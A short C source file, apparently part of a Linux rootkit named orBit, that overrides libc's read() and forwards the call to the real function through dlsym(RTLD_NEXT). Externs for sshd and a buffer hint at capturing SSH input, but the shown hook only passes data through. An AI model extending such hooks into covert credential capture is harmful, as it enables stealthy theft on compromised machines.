#include "orBit.h"
extern uint8_t  sshd;
extern int      fd;
extern char     buf[ SIZE_BUF ];

ssize_t read( int fd, void *content, size_t count )
{
    static ssize_t ( *func_read ) ( int, void *, size_t ) = NULL;
    if ( ! func_read )
        func_read = (ssize_t (*) ( int, void *, size_t )) dlsym ( RTLD_NEXT, "read");
    ssize_t res = func_read( fd, content, count );
    return ( res );
}
